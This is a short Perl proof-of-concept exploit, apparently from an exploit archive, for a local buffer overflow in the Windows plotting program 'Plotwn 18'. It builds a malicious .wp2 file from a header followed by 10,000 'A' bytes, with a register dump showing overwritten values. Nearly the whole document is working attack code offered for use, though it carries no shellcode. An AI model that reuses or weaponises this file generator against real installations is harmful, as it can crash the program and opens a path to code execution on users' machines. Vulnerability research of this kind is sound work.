#!/usr/bin/perl
###################################################################
#Exploit Title : Plotwn 18 (.wp2) local Buffer Overflow Poc
#tested on windows xp SP 3 FR
#Author: MadjiX - Dz8[at]HotmaiL[dot]CoM
#download: http://math.exeter.edu/rparris/peanut/wpfr32z.exe
#Special Greets:Bibi-info , His0k4 [ where are you :( ]
###################################################################
#EAX 0012F2F8
#ECX 00B089CC
#EDX 00001CB5
#EBX 41414141
#ESP 0012F2AC
#EBP 0012F2B0
#ESI 00000025
#EDI 0000003B
#EIP 00506723 wplotfr.00506723
#C 0 ES 0023 32bit 0(FFFFFFFF)
#P 1 CS 001B 32bit 0(FFFFFFFF)
#A 0 SS 0023 32bit 0(FFFFFFFF)
#Z 0 DS 0023 32bit 0(FFFFFFFF)
#S 0 FS 003B 32bit 7FFDF000(FFF)
###################################################################
my $file = "MadjiX.wp2";

my $hd =
"\x49\x03\x00\x00\x25\x00\x00\x00\x2E\x00\x00\x00\x43\x00\x00\x00\x00\x02\x00\x00\x00\x02".
"\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x3D\x00\x00\x00\xD9\xFF\xFF\xFF\x2C\x01\x00\x00".
"\x64\x00\x00\x00\x64\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0A\x00\x00\x00\x0F\x00".
"\x00\x00\x2B\xD0\x28\x01\x49\x1E\x29\x01\x00\x00\x00\x00\x0C\x00\x00\x00\x0A\x00\x00\x00";

my $junk = "\x41" x 10000 ;
open($FILE,">$file");
print $FILE $hd.$junk;
close($FILE);